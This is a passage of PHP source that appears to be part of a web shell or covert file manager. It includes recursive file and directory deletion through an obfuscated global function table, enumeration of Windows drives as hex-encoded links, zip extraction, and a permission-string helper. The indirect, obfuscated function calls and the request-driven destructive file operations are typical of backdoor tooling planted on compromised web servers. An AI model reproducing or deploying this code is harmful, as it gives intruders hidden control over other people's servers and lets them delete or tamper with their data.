                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function extractArchive($archiveFilename, $extractPath)
{
    $zip = new ZipArchive();

    if ($zip->open($archiveFilename) === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
